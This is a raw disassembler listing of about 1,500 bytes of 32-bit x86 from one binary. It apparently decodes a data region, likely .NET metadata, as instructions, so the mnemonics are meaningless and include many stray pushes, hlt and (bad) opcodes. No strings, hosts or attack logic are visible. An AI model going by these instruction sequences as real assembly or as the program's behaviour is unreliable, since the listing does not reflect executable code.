  404806:	00 08                	add    %cl,(%eax)
  404808:	06                   	push   %es
  404809:	00 98 04 d5 0b 06    	add    %bl,0x60bd504(%eax)
  40480f:	00 f8                	add    %bh,%al
  404811:	04 8f                	add    $0x8f,%al
  404813:	0b 06                	or     (%esi),%eax
  404815:	00 26                	add    %ah,(%esi)
  404817:	09 00                	or     %eax,(%eax)
  404819:	08 06                	or     %al,(%esi)
  40481b:	00 72 0f             	add    %dh,0xf(%edx)
  40481e:	74 00                	je     0x404820
  404820:	06                   	push   %es
  404821:	00 0b                	add    %cl,(%ebx)
  404823:	0f 74 00             	pcmpeqb (%eax),%mm0
  404826:	06                   	push   %es
  404827:	00 8e 0e 00 08 06    	add    %cl,0x608000e(%esi)
  40482d:	00 8a 06 00 08 06    	add    %cl,0x6080006(%edx)
  404833:	00 da                	add    %bl,%dl
  404835:	09 10                	or     %edx,(%eax)
  404837:	0b 06                	or     (%esi),%eax
  404839:	00 48 0e             	add    %cl,0xe(%eax)
  40483c:	00 08                	add    %cl,(%eax)
  40483e:	06                   	push   %es
  40483f:	00 20                	add    %ah,(%eax)
  404841:	03 f4                	add    %esp,%esi
  404843:	00 1a                	add    %bl,(%edx)
  404845:	00 c1                	add    %al,%cl
  404847:	08 93 0c 0e 00 e0    	or     %dl,-0x1ffff1f4(%ebx)
  40484d:	08 79 01             	or     %bh,0x1(%ecx)
  404850:	0e                   	push   %cs
  404851:	00 49 03             	add    %cl,0x3(%ecx)
  404854:	79 01                	jns    0x404857
  404856:	0e                   	push   %cs
  404857:	00 49 01             	add    %cl,0x1(%ecx)
  40485a:	ae                   	scas   %es:(%edi),%al
  40485b:	0b 06                	or     (%esi),%eax
  40485d:	00 26                	add    %ah,(%esi)
  40485f:	06                   	push   %es
  404860:	c2 0e 0e             	ret    $0xe0e
  404863:	00 b1 0c ae 0b 06    	add    %dh,0x60bae0c(%ecx)
  404869:	00 47 08             	add    %al,0x8(%edi)
  40486c:	00 08                	add    %cl,(%eax)
  40486e:	06                   	push   %es
  40486f:	00 ea                	add    %ch,%dl
  404871:	07                   	pop    %es
  404872:	f4                   	hlt
  404873:	00 06                	add    %al,(%esi)
  404875:	00 4c 00 5e          	add    %cl,0x5e(%eax,%eax,1)
  404879:	01 0e                	add    %ecx,(%esi)
  40487b:	00 50 0c             	add    %dl,0xc(%eax)
  40487e:	79 01                	jns    0x404881
  404880:	0e                   	push   %cs
  404881:	00 dd                	add    %bl,%ch
  404883:	01 79 01             	add    %edi,0x1(%ecx)
  404886:	06                   	push   %es
  404887:	00 f0                	add    %dh,%al
  404889:	07                   	pop    %es
  40488a:	f4                   	hlt
  40488b:	00 06                	add    %al,(%esi)
  40488d:	00 f0                	add    %dh,%al
  40488f:	0e                   	push   %cs
  404890:	00 08                	add    %cl,(%eax)
  404892:	0a 00                	or     (%eax),%al
  404894:	58                   	pop    %eax
  404895:	0c 74                	or     $0x74,%al
  404897:	00 0a                	add    %cl,(%edx)
  404899:	00 bd 0c 74 00 0a    	add    %bh,0xa00740c(%ebp)
  40489f:	00 df                	add    %bl,%bh
  4048a1:	07                   	pop    %es
  4048a2:	a9 08 0a 00 56       	test   $0x56000a08,%eax
  4048a7:	02 a9 08 06 00 6f    	add    0x6f000608(%ecx),%ch
  4048ad:	05 00 08 06 00       	add    $0x60800,%eax
  4048b2:	c8 02 00 08          	enter  $0x2,$0x8
  4048b6:	06                   	push   %es
  4048b7:	00 4e 0a             	add    %cl,0xa(%esi)
  4048ba:	00 08                	add    %cl,(%eax)
  4048bc:	0e                   	push   %cs
  4048bd:	00 de                	add    %bl,%dh
  4048bf:	0c ae                	or     $0xae,%al
  4048c1:	0b 0e                	or     (%esi),%ecx
  4048c3:	00 5b 0a             	add    %bl,0xa(%ebx)
  4048c6:	39 0b                	cmp    %ecx,(%ebx)
  4048c8:	0e                   	push   %cs
  4048c9:	00 7a 09             	add    %bh,0x9(%edx)
  4048cc:	39 0b                	cmp    %ecx,(%ebx)
  4048ce:	06                   	push   %es
  4048cf:	00 b9 03 00 08 06    	add    %bh,0x6080003(%ecx)
  4048d5:	00 57 09             	add    %dl,0x9(%edi)
  4048d8:	f4                   	hlt
  4048d9:	00 06                	add    %al,(%esi)
  4048db:	00 60 09             	add    %ah,0x9(%eax)
  4048de:	f4                   	hlt
  4048df:	00 16                	add    %dl,(%esi)
  4048e1:	00 fe                	add    %bh,%dh
  4048e3:	08 2f                	or     %ch,(%edi)
  4048e5:	0e                   	push   %cs
  4048e6:	db 00                	fildl  (%eax)
  4048e8:	9f                   	lahf
  4048e9:	0a 00                	or     (%eax),%al
  4048eb:	00 16                	add    %dl,(%esi)
  4048ed:	00 82 0d 2f 0e 16    	add    %al,0x160e2f0d(%edx)
  4048f3:	00 e8                	add    %ch,%al
  4048f5:	0c 2f                	or     $0x2f,%al
  4048f7:	0e                   	push   %cs
  4048f8:	16                   	push   %ss
  4048f9:	00 5b 0d             	add    %bl,0xd(%ebx)
  4048fc:	2f                   	das
  4048fd:	0e                   	push   %cs
  4048fe:	06                   	push   %es
  4048ff:	00 c2                	add    %al,%dl
  404901:	09 c2                	or     %eax,%edx
  404903:	0e                   	push   %cs
  404904:	06                   	push   %es
  404905:	00 a9 09 17 0f 06    	add    %ch,0x60f1709(%ecx)
  40490b:	00 1a                	add    %bl,(%edx)
  40490d:	08 17                	or     %dl,(%edi)
  40490f:	0f 16 00             	movhps (%eax),%xmm0
  404912:	e3 09                	jecxz  0x40491d
  404914:	2f                   	das
  404915:	0e                   	push   %cs
  404916:	06                   	push   %es
  404917:	00 7b 0f             	add    %bh,0xf(%ebx)
  40491a:	3b 07                	cmp    (%edi),%eax
  40491c:	06                   	push   %es
  40491d:	00 55 07             	add    %dl,0x7(%ebp)
  404920:	3b 07                	cmp    (%edi),%eax
  404922:	06                   	push   %es
  404923:	00 2e                	add    %ch,(%esi)
  404925:	03 3b                	add    (%ebx),%edi
  404927:	07                   	pop    %es
  404928:	0a 00                	or     (%eax),%al
  40492a:	03 0d 10 0b 06 00    	add    0x60b10,%ecx
  404930:	41                   	inc    %ecx
  404931:	0e                   	push   %cs
  404932:	8f                   	(bad)
  404933:	0b 06                	or     (%esi),%eax
  404935:	00 68 0f             	add    %ch,0xf(%eax)
  404938:	f4                   	hlt
  404939:	00 0e                	add    %cl,(%esi)
  40493b:	00 91 0f f5 0b 06    	add    %dl,0x60bf50f(%ecx)
  404941:	00 75 0e             	add    %dh,0xe(%ebp)
  404944:	f4                   	hlt
  404945:	05 06 00 94 01       	add    $0x1940006,%eax
  40494a:	f4                   	hlt
  40494b:	05 06 00 53 04       	add    $0x4530006,%eax
  404950:	f4                   	hlt
  404951:	05 06 00 de 0e       	add    $0xede0006,%eax
  404956:	f4                   	hlt
  404957:	05 12 00 03 03       	add    $0x3030012,%eax
  40495c:	9b                   	fwait
  40495d:	06                   	push   %es
  40495e:	12 00                	adc    (%eax),%al
  404960:	95                   	xchg   %eax,%ebp
  404961:	09 9b 06 12 00 e6    	or     %ebx,-0x19ffedfa(%ebx)
  404967:	05 9b 06 12 00       	add    $0x12069b,%eax
  40496c:	07                   	pop    %es
  40496d:	0b 9b 06 1a 00 69    	or     0x69001a06(%ebx),%ebx
  404973:	08 93 0c 12 00 45    	or     %dl,0x4500120c(%ebx)
  404979:	0d 2f 06 12 00       	or     $0x12062f,%eax
  40497e:	8a 02                	mov    (%edx),%al
  404980:	9b                   	fwait
  404981:	06                   	push   %es
  404982:	12 00                	adc    (%eax),%al
  404984:	cd 08                	int    $0x8
  404986:	9b                   	fwait
  404987:	06                   	push   %es
  404988:	12 00                	adc    (%eax),%al
  40498a:	f2 0d 9b 06 12 00    	repnz or $0x12069b,%eax
  404990:	39 0d 2f 06 06 00    	cmp    %ecx,0x6062f
  404996:	41                   	inc    %ecx
  404997:	03 00                	add    (%eax),%eax
  404999:	08 06                	or     %al,(%esi)
  40499b:	00 4c 09 ec          	add    %cl,-0x14(%ecx,%ecx,1)
  40499f:	08 06                	or     %al,(%esi)
  4049a1:	00 8d 08 00 08 06    	add    %cl,0x6080008(%ebp)
  4049a7:	00 34 0f             	add    %dh,(%edi,%ecx,1)
  4049aa:	ec                   	in     (%dx),%al
  4049ab:	08 06                	or     %al,(%esi)
  4049ad:	00 6f 09             	add    %ch,0x9(%edi)
  4049b0:	ec                   	in     (%dx),%al
  4049b1:	08 06                	or     %al,(%esi)
  4049b3:	00 86 00 00 08 06    	add    %al,0x6080000(%esi)
  4049b9:	00 f3                	add    %dh,%bl
  4049bb:	03 ec                	add    %esp,%ebp
  4049bd:	08 0a                	or     %cl,(%edx)
  4049bf:	00 25 0e 0b 0d 06    	add    %ah,0x60d0b0e
  4049c5:	00 28                	add    %ch,(%eax)
  4049c7:	08 00                	or     %al,(%eax)
  4049c9:	08 06                	or     %al,(%esi)
  4049cb:	00 2e                	add    %ch,(%esi)
  4049cd:	0a f4                	or     %ah,%dh
  4049cf:	05 06 00 82 0e       	add    $0xe820006,%eax
  4049d4:	f4                   	hlt
  4049d5:	05 0a 00 c5 0d       	add    $0xdc5000a,%eax
  4049da:	0b 0d 0a 00 71 02    	or     0x271000a,%ecx
  4049e0:	0b 0d 0a 00 44 0c    	or     0xc44000a,%ecx
  4049e6:	0b 0d 0e 00 17 06    	or     0x617000e,%ecx
  4049ec:	ae                   	scas   %es:(%edi),%al
  4049ed:	0b 06                	or     (%esi),%eax
  4049ef:	00 ef                	add    %ch,%bh
  4049f1:	06                   	push   %es
  4049f2:	f4                   	hlt
  4049f3:	05 0a 00 1b 0e       	add    $0xe1b000a,%eax
  4049f8:	ba 0d 0a 00 29       	mov    $0x29000a0d,%edx
  4049fd:	07                   	pop    %es
  4049fe:	ba 0d 0a 00 6f       	mov    $0x6f000a0d,%edx
  404a03:	0c ba                	or     $0xba,%al
  404a05:	0d 0a 00 54 0e       	or     $0xe54000a,%eax
  404a0a:	87 07                	xchg   %eax,(%edi)
  404a0c:	06                   	push   %es
  404a0d:	00 df                	add    %bl,%bh
  404a0f:	0a f4                	or     %ah,%dh
  404a11:	05 06 00 a4 01       	add    $0x1a40006,%eax
  404a16:	17                   	pop    %ss
  404a17:	0f 06                	clts
  404a19:	00 07                	add    %al,(%edi)
  404a1b:	08 17                	or     %dl,(%edi)
  404a1d:	0f 06                	clts
  404a1f:	00 66 02             	add    %ah,0x2(%esi)
  404a22:	17                   	pop    %ss
  404a23:	0f 06                	clts
  404a25:	00 2f                	add    %ch,(%edi)
  404a27:	08 17                	or     %dl,(%edi)
  404a29:	0f 06                	clts
  404a2b:	00 ca                	add    %cl,%dl
  404a2d:	06                   	push   %es
  404a2e:	f4                   	hlt
  404a2f:	00 06                	add    %al,(%esi)
  404a31:	00 f8                	add    %bh,%al
  404a33:	02 f4                	add    %ah,%dh
  404a35:	05 06 00 87 09       	add    $0x9870006,%eax
  404a3a:	f4                   	hlt
  404a3b:	00 06                	add    %al,(%esi)
  404a3d:	00 d4                	add    %dl,%ah
  404a3f:	07                   	pop    %es
  404a40:	f4                   	hlt
  404a41:	00 06                	add    %al,(%esi)
  404a43:	00 3e                	add    %bh,(%esi)
  404a45:	02 f4                	add    %ah,%dh
  404a47:	00 06                	add    %al,(%esi)
  404a49:	00 f8                	add    %bh,%al
  404a4b:	0c f4                	or     $0xf4,%al
  404a4d:	00 0a                	add    %cl,(%edx)
  404a4f:	00 fc                	add    %bh,%ah
  404a51:	09 74 00 0a          	or     %esi,0xa(%eax,%eax,1)
  404a55:	00 1e                	add    %bl,(%esi)
  404a57:	0d 74 00 06 00       	or     $0x60074,%eax
  404a5c:	85 04 00             	test   %eax,(%eax,%eax,1)
  404a5f:	08 06                	or     %al,(%esi)
  404a61:	00 40 08             	add    %al,0x8(%eax)
  404a64:	00 08                	add    %cl,(%eax)
  404a66:	00 00                	add    %al,(%eax)
  404a68:	00 00                	add    %al,(%eax)
  404a6a:	b1 00                	mov    $0x0,%cl
  404a6c:	00 00                	add    %al,(%eax)
  404a6e:	00 00                	add    %al,(%eax)
  404a70:	01 00                	add    %eax,(%eax)
  404a72:	01 00                	add    %eax,(%eax)
  404a74:	00 00                	add    %al,(%eax)
  404a76:	00 00                	add    %al,(%eax)
  404a78:	bf 08 e4 0e 05       	mov    $0x50ee408,%edi
  404a7d:	00 01                	add    %al,(%ecx)
  404a7f:	00 01                	add    %al,(%ecx)
  404a81:	00 00                	add    %al,(%eax)
  404a83:	00 00                	add    %al,(%eax)
  404a85:	00 6a 0a             	add    %ch,0xa(%edx)
  404a88:	e4 0e                	in     $0xe,%al
  404a8a:	15 00 01 00 02       	adc    $0x2000100,%eax
  404a8f:	00 00                	add    %al,(%eax)
  404a91:	01 10                	add    %edx,(%eax)
  404a93:	00 93 0d e4 0e 1d    	add    %dl,0x1d0ee40d(%ebx)
  404a99:	00 01                	add    %al,(%ecx)
  404a9b:	00 03                	add    %al,(%ebx)
  404a9d:	00 05 01 00 00 57    	add    %al,0x57000001
  404aa3:	0b 00                	or     (%eax),%eax
  404aa5:	00 1d 00 05 00 08    	add    %bl,0x8000500
  404aab:	00 05 01 00 00 31    	add    %al,0x31000001
  404ab1:	00 00                	add    %al,(%eax)
  404ab3:	00 1d 00 05 00 0f    	add    %bl,0xf000500
  404ab9:	00 01                	add    %al,(%ecx)
  404abb:	00 00                	add    %al,(%eax)
  404abd:	00 46 1a             	add    %al,0x1a(%esi)
  404ac0:	40                   	inc    %eax
  404ac1:	12 1d 00 06 00 11    	adc    0x11000600,%bl
  404ac7:	00 00                	add    %al,(%eax)
  404ac9:	01 00                	add    %eax,(%eax)
  404acb:	00 8d 20 d2 0f 1d    	add    %cl,0x1d0fd220(%ebp)
  404ad1:	00 06                	add    %al,(%esi)
  404ad3:	00 14 00             	add    %dl,(%eax,%eax,1)
  404ad6:	01 00                	add    %eax,(%eax)
  404ad8:	10 00                	adc    %al,(%eax)
  404ada:	82 16 a0             	adcb   $0xa0,(%esi)
  404add:	1e                   	push   %ds
  404ade:	1d 00 06 00 1e       	sbb    $0x1e000600,%eax
  404ae3:	00 01                	add    %al,(%ecx)
  404ae5:	00 00                	add    %al,(%eax)
  404ae7:	00 ff                	add    %bh,%bh
  404ae9:	20 53 1f             	and    %dl,0x1f(%ebx)
  404aec:	1d 00 07 00 30       	sbb    $0x30000700,%eax
  404af1:	00 05 01 00 00 01    	add    %al,0x1000001
  404af7:	00 00                	add    %al,(%eax)
  404af9:	00 1d 00 07 00 32    	add    %bl,0x32000700
  404aff:	00 01                	add    %al,(%ecx)
  404b01:	00 10                	add    %dl,(%eax)
  404b03:	00 b4 19 fb 1b 1d 00 	add    %dh,0x1d1bfb(%ecx,%ebx,1)
  404b0a:	08 00                	or     %al,(%eax)
  404b0c:	34 00                	xor    $0x0,%al
  404b0e:	01 00                	add    %eax,(%eax)
  404b10:	00 00                	add    %al,(%eax)
  404b12:	4f                   	dec    %edi
  404b13:	1e                   	push   %ds
  404b14:	94                   	xchg   %eax,%esp
  404b15:	17                   	pop    %ss
  404b16:	1d 00 1b 00 36       	sbb    $0x36001b00,%eax
  404b1b:	00 01                	add    %al,(%ecx)
  404b1d:	00 10                	add    %dl,(%eax)
  404b1f:	00 c8                	add    %cl,%al
  404b21:	18 6a 10             	sbb    %ch,0x10(%edx)
  404b24:	1d 00 1b 00 3a       	sbb    $0x3a001b00,%eax
  404b29:	00 01                	add    %al,(%ecx)
  404b2b:	00 10                	add    %dl,(%eax)
  404b2d:	00 a7 1b 7c 1b 1d    	add    %ah,0x1d1b7c1b(%edi)
  404b33:	00 1c 00             	add    %bl,(%eax,%eax,1)
  404b36:	3e 00 05 21 00 00 0e 	add    %al,%ds:0xe000021
  404b3d:	01 00                	add    %eax,(%eax)
  404b3f:	00 1d 00 2a 00 45    	add    %bl,0x45002a00
  404b45:	00 01                	add    %al,(%ecx)
  404b47:	00 00                	add    %al,(%eax)
  404b49:	00 3e                	add    %bh,(%esi)
  404b4b:	16                   	push   %ss
  404b4c:	53                   	push   %ebx
  404b4d:	12 1d 00 2d 00 49    	adc    0x49002d00,%bl
  404b53:	00 01                	add    %al,(%ecx)
  404b55:	00 00                	add    %al,(%eax)
  404b57:	00 90 14 14 1a 1d    	add    %dl,0x1d1a1414(%eax)
  404b5d:	00 2d 00 4c 00 01    	add    %ch,0x1004c00
  404b63:	00 00                	add    %al,(%eax)
  404b65:	00 6c 17 a0          	add    %ch,-0x60(%edi,%edx,1)
  404b69:	0f 1d 00             	nopl   (%eax)
  404b6c:	2d 00 4e 00 01       	sub    $0x1004e00,%eax
  404b71:	00 10                	add    %dl,(%eax)
  404b73:	00 3d 13 c8 1c 1d    	add    %bh,0x1d1cc813
  404b79:	00 2d 00 53 00 01    	add    %ch,0x1005300
  404b7f:	00 00                	add    %al,(%eax)
  404b81:	00 2a                	add    %ch,(%edx)
  404b83:	17                   	pop    %ss
  404b84:	cb                   	lret
  404b85:	10 1d 00 2e 00 5a    	adc    %bl,0x5a002e00
  404b8b:	00 02                	add    %al,(%edx)
  404b8d:	01 00                	add    %eax,(%eax)
  404b8f:	00 e1                	add    %ah,%cl
  404b91:	00 00                	add    %al,(%eax)
  404b93:	00 d9                	add    %bl,%cl
  404b95:	01 2e                	add    %ebp,(%esi)
  404b97:	00 5d 00             	add    %bl,0x0(%ebp)
  404b9a:	31 00                	xor    %eax,(%eax)
  404b9c:	75 12                	jne    0x404bb0
  404b9e:	4a                   	dec    %edx
  404b9f:	00 31                	add    %dh,(%ecx)
  404ba1:	00 5d 16             	add    %bl,0x16(%ebp)
  404ba4:	52                   	push   %edx
  404ba5:	00 31                	add    %dh,(%ecx)
  404ba7:	00 b5 20 5a 00 31    	add    %dh,0x31005a20(%ebp)
  404bad:	00 50 15             	add    %dl,0x15(%eax)
  404bb0:	62 00                	bound  %eax,(%eax)
  404bb2:	11 00                	adc    %eax,(%eax)
  404bb4:	74 05                	je     0x404bbb
  404bb6:	ad                   	lods   %ds:(%esi),%eax
  404bb7:	01 11                	add    %edx,(%ecx)
  404bb9:	00 6a 19             	add    %ch,0x19(%edx)
  404bbc:	fc                   	cld
  404bbd:	02 06                	add    (%esi),%al
  404bbf:	00 99 00 15 04 16    	add    %bl,0x16041500(%ecx)
  404bc5:	00 8d 1e 8b 03 16    	add    %cl,0x16038b1e(%ebp)
  404bcb:	00 c6                	add    %al,%dh
  404bcd:	12 8b 03 16 00 fe    	adc    -0x1ffe9fd(%ebx),%cl
  404bd3:	16                   	push   %ss
  404bd4:	20 04 16             	and    %al,(%esi,%edx,1)
  404bd7:	00 d6                	add    %dl,%dh
  404bd9:	1b 8b 03 16 00 12    	sbb    0x12001603(%ebx),%ecx
  404bdf:	20 8b 03 16 00 27    	and    %cl,0x27001603(%ebx)
  404be5:	13 8b 03 16 00 fe    	adc    -0x1ffe9fd(%ebx),%ecx
  404beb:	17                   	pop    %ss
  404bec:	8b 03                	mov    (%ebx),%eax
  404bee:	16                   	push   %ss
  404bef:	00 29                	add    %ch,(%ecx)
  404bf1:	19 23                	sbb    %esp,(%ebx)
  404bf3:	04 16                	add    $0x16,%al
  404bf5:	00 7a 10             	add    %bh,0x10(%edx)
  404bf8:	28 04 16             	sub    %al,(%esi,%edx,1)
  404bfb:	00 2d 1a 28 04 16    	add    %ch,0x1604281a
  404c01:	00 39                	add    %bh,(%ecx)
  404c03:	18 28                	sbb    %ch,(%eax)
  404c05:	04 16                	add    $0x16,%al
  404c07:	00 1b                	add    %bl,(%ebx)
  404c09:	1b 28                	sbb    (%eax),%ebp
  404c0b:	04 16                	add    $0x16,%al
  404c0d:	00 cb                	add    %cl,%bl
  404c0f:	15 8b 03 16 00       	adc    $0x16038b,%eax
  404c14:	da 1a                	ficompl (%edx)
  404c16:	8b 03                	mov    (%ebx),%eax
  404c18:	16                   	push   %ss
  404c19:	00 a5 10 fc 02 16    	add    %ah,0x1602fc10(%ebp)
  404c1f:	00 89 11 8b 03 16    	add    %cl,0x16038b11(%ecx)
  404c25:	00 f1                	add    %dh,%cl
  404c27:	0f 28 04 16          	movaps (%esi,%edx,1),%xmm0
  404c2b:	00 e4                	add    %ah,%ah
  404c2d:	1e                   	push   %ds
  404c2e:	8b 03                	mov    (%ebx),%eax
  404c30:	16                   	push   %ss
  404c31:	00 7e 13             	add    %bh,0x13(%esi)
  404c34:	20 04 11             	and    %al,(%ecx,%edx,1)
  404c37:	00 1c 11             	add    %bl,(%ecx,%edx,1)
  404c3a:	fc                   	cld
  404c3b:	02 16                	add    (%esi),%dl
  404c3d:	00 12                	add    %dl,(%edx)
  404c3f:	21 8b 03 16 00 3e    	and    %ecx,0x3e001603(%ebx)
  404c45:	1b 8b 03 16 00 11    	sbb    0x11001603(%ebx),%ecx
  404c4b:	12 fd                	adc    %ch,%bh
  404c4d:	04 16                	add    $0x16,%al
  404c4f:	00 63 11             	add    %ah,0x11(%ebx)
  404c52:	02 05 16 00 95 1f    	add    0x1f950016,%al
  404c58:	07                   	pop    %es
  404c59:	05 16 00 f7 1c       	add    $0x1cf70016,%eax
  404c5e:	28 04 16             	sub    %al,(%esi,%edx,1)
  404c61:	00 07                	add    %al,(%edi)
  404c63:	10 0c 05 16 00 a8 1d 	adc    %cl,0x1da80016(,%eax,1)
  404c6a:	11 05 16 00 11 18    	adc    %eax,0x18110016
  404c70:	20 04 16             	and    %al,(%esi,%edx,1)
  404c73:	00 2d 12 16 05 16    	add    %ch,0x16051612
  404c79:	00 7d 1d             	add    %bh,0x1d(%ebp)
  404c7c:	28 04 16             	sub    %al,(%esi,%edx,1)
  404c7f:	00 84 1c 28 04 16 00 	add    %al,0x160428(%esp,%ebx,1)
  404c86:	6b 1c 20 04          	imul   $0x4,(%eax,%eiz,1),%ebx
  404c8a:	16                   	push   %ss
  404c8b:	00 01                	add    %al,(%ecx)
  404c8d:	1a 20                	sbb    (%eax),%ah
  404c8f:	04 36                	add    $0x36,%al
  404c91:	00 f1                	add    %dh,%cl
  404c93:	00 c6                	add    %al,%dh
  404c95:	05 16 00 19 00       	add    $0x190016,%eax
  404c9a:	ca 05 16             	lret   $0x1605
  404c9d:	00 53 00             	add    %dl,0x0(%ebx)
  404ca0:	cf                   	iret
  404ca1:	05 16 00 d4 14       	add    $0x14d40016,%eax
  404ca6:	fc                   	cld
  404ca7:	02 06                	add    (%esi),%al
  404ca9:	06                   	push   %es
  404caa:	41                   	inc    %ecx
  404cab:	01 20                	add    %esp,(%eax)
  404cad:	04 56                	add    $0x56,%al
  404caf:	80 ba 00 95 06 56 80 	cmpb   $0x80,0x56069500(%edx)
  404cb6:	cd 00                	int    $0x0
  404cb8:	95                   	xchg   %eax,%ebp
  404cb9:	06                   	push   %es
  404cba:	56                   	push   %esi
  404cbb:	80 fe 00             	cmp    $0x0,%dh
  404cbe:	95                   	xchg   %eax,%ebp
  404cbf:	06                   	push   %es
  404cc0:	50                   	push   %eax
  404cc1:	20 00                	and    %al,(%eax)
  404cc3:	00 00                	add    %al,(%eax)
  404cc5:	00 06                	add    %al,(%esi)
  404cc7:	18 d2                	sbb    %dl,%dl
  404cc9:	0a 13                	or     (%ebx),%dl
  404ccb:	00 01                	add    %al,(%ecx)
  404ccd:	00 58 20             	add    %bl,0x20(%eax)
  404cd0:	00 00                	add    %al,(%eax)
  404cd2:	00 00                	add    %al,(%eax)
  404cd4:	06                   	push   %es
  404cd5:	18 d2                	sbb    %dl,%dl
  404cd7:	0a 13                	or     (%ebx),%dl
  404cd9:	00 01                	add    %al,(%ecx)
  404cdb:	00 60 20             	add    %ah,0x20(%eax)
  404cde:	00 00                	add    %al,(%eax)
  404ce0:	00 00                	add    %al,(%eax)
  404ce2:	11 18                	adc    %ebx,(%eax)
  404ce4:	d8 0a                	fmuls  (%edx)
  404ce6:	86 00                	xchg   %al,(%eax)
  404ce8:	01 00                	add    %eax,(%eax)
  404cea:	8a 20                	mov    (%eax),%ah
  404cec:	00 00                	add    %al,(%eax)
  404cee:	00 00                	add    %al,(%eax)
  404cf0:	13 08                	adc    (%eax),%ecx
  404cf2:	87 1a                	xchg   %ebx,(%edx)
  404cf4:	8f 00                	pop    (%eax)
  404cf6:	01 00                	add    %eax,(%eax)
  404cf8:	96                   	xchg   %eax,%esi
  404cf9:	20 00                	and    %al,(%eax)
  404cfb:	00 00                	add    %al,(%eax)
  404cfd:	00 13                	add    %dl,(%ebx)
  404cff:	08 a8 1f 94 00 01    	or     %ch,0x100941f(%eax)
  404d05:	00 a2 20 00 00 00    	add    %ah,0x20(%edx)
  404d0b:	00 13                	add    %dl,(%ebx)
  404d0d:	08 bc 1e 99 00 01 00 	or     %bh,0x10099(%esi,%ebx,1)
  404d14:	ae                   	scas   %es:(%edi),%al
  404d15:	20 00                	and    %al,(%eax)
  404d17:	00 00                	add    %al,(%eax)
  404d19:	00 13                	add    %dl,(%ebx)
  404d1b:	08 ac 18 9e 00 01 00 	or     %ch,0x1009e(%eax,%ebx,1)
  404d22:	ba 20 00 00 00       	mov    $0x20,%edx
  404d27:	00 c6                	add    %al,%dh
  404d29:	02 8c 0c 07 01 01 00 	add    0x10107(%esp,%ecx,1),%cl
  404d30:	c8 20 00 00          	enter  $0x20,$0x0
  404d34:	00 00                	add    %al,(%eax)
  404d36:	c6 02 29             	movb   $0x29,(%edx)
  404d39:	02 0c 01             	add    (%ecx,%eax,1),%cl
  404d3c:	02 00                	add    (%eax),%al
  404d3e:	d0 20                	shlb   $1,(%eax)
  404d40:	00 00                	add    %al,(%eax)
  404d42:	00 00                	add    %al,(%eax)
  404d44:	83 00 eb             	addl   $0xffffffeb,(%eax)
  404d47:	03 17                	add    (%edi),%edx
  404d49:	01 02                	add    %eax,(%edx)
  404d4b:	00 dc                	add    %bl,%ah
  404d4d:	20 00                	and    %al,(%eax)
  404d4f:	00 00                	add    %al,(%eax)
  404d51:	00 c6                	add    %al,%dh
  404d53:	02 7e 06             	add    0x6(%esi),%bh
  404d56:	1c 01                	sbb    $0x1,%al
  404d58:	02 00                	add    (%eax),%al
  404d5a:	e4 20                	in     $0x20,%al
  404d5c:	00 00                	add    %al,(%eax)
  404d5e:	00 00                	add    %al,(%eax)
  404d60:	11 00                	adc    %eax,(%eax)
  404d62:	2e 01 33             	add    %esi,%cs:(%ebx)
  404d65:	01 02                	add    %eax,(%edx)
  404d67:	00 04 21             	add    %al,(%ecx,%eiz,1)
  404d6a:	00 00                	add    %al,(%eax)
  404d6c:	00 00                	add    %al,(%eax)
  404d6e:	01 00                	add    %eax,(%eax)
  404d70:	1a 01                	sbb    (%ecx),%al
  404d72:	3b 01                	cmp    (%ecx),%eax
  404d74:	03 00                	add    (%eax),%eax
  404d76:	0d 21 00 00 00       	or     $0x21,%eax
  404d7b:	00 06                	add    %al,(%esi)
  404d7d:	18 d2                	sbb    %dl,%dl
  404d7f:	0a 13                	or     (%ebx),%dl
  404d81:	00 04 00             	add    %al,(%eax,%eax,1)
  404d84:	15 21 00 00 00       	adc    $0x21,%eax
  404d89:	00 03                	add    %al,(%ebx)
  404d8b:	08 10                	or     %dl,(%eax)
  404d8d:	02 8a 00 04 00 0d    	add    0xd000400(%edx),%cl
  404d93:	21 00                	and    %eax,(%eax)
  404d95:	00 00                	add    %al,(%eax)
  404d97:	00 06                	add    %al,(%esi)
  404d99:	18 d2                	sbb    %dl,%dl
  404d9b:	0a 13                	or     (%ebx),%dl
  404d9d:	00 04 00             	add    %al,(%eax,%eax,1)
  404da0:	0d 21 00 00 00       	or     $0x21,%eax
  404da5:	00 06                	add    %al,(%esi)
  404da7:	18 d2                	sbb    %dl,%dl
  404da9:	0a 13                	or     (%ebx),%dl
  404dab:	00 04 00             	add    %al,(%eax,%eax,1)
  404dae:	00 00                	add    %al,(%eax)
  404db0:	00 00                	add    %al,(%eax)
  404db2:	80 00 16             	addb   $0x16,(%eax)
  404db5:	20 69 1b             	and    %ch,0x1b(%ecx)
  404db8:	d0 01                	rolb   $1,(%ecx)
  404dba:	04 00                	add    $0x0,%al
  404dbc:	34 21                	xor    $0x21,%al
  404dbe:	00 00                	add    %al,(%eax)
  404dc0:	48                   	dec    %eax
  404dc1:	00 16                	add    %dl,(%esi)
  404dc3:	00 49 1c             	add    %cl,0x1c(%ecx)
  404dc6:	86 00                	xchg   %al,(%eax)
  404dc8:	05 00 48 22 00       	add    $0x224800,%eax
  404dcd:	00 00                	add    %al,(%eax)
  404dcf:	00 16                	add    %dl,(%esi)
  404dd1:	00 d6                	add    %dl,%dh
  404dd3:	19 df                	sbb    %ebx,%edi
  404dd5:	01 05 00 55 22 00    	add    %eax,0x225500
  404ddb:	00 00                	add    %al,(%eax)
  404ddd:	00 16                	add    %dl,(%esi)
  404ddf:	00 1f                	add    %bl,(%edi)
  404de1:	16                   	push   %ss
  404de2:	32 02                	xor    (%edx),%al
  404de4:	06                   	push   %es
  404de5:	00 64 22 00          	add    %ah,0x0(%edx,%eiz,1)
  404de9:	00 00                	add    %al,(%eax)
  404deb:	00 16                	add    %dl,(%esi)
  404ded:	00 65 1a             	add    %ah,0x1a(%ebp)
  404df0:	38 02                	cmp    %al,(%edx)
  404df2:	07                   	pop    %es
  404df3:	00 b4 22 00 00 00 00 	add    %dh,0x0(%edx,%eiz,1)
  404dfa:	16                   	push   %ss
  404dfb:	00 f4                	add    %dh,%ah
  404dfd:	13 fa                	adc    %edx,%edi
  404dff:	01 08                	add    %ecx,(%eax)
  404e01:	00 10                	add    %dl,(%eax)
  404e03:	23 00                	and    (%eax),%eax
  404e05:	00 00                	add    %al,(%eax)
  404e07:	00 16                	add    %dl,(%esi)
  404e09:	00 03                	add    %al,(%ebx)
  404e0b:	11 4e 02             	adc    %ecx,0x2(%esi)
  404e0e:	09 00                	or     %eax,(%eax)
  404e10:	6c                   	insb   (%dx),%es:(%edi)
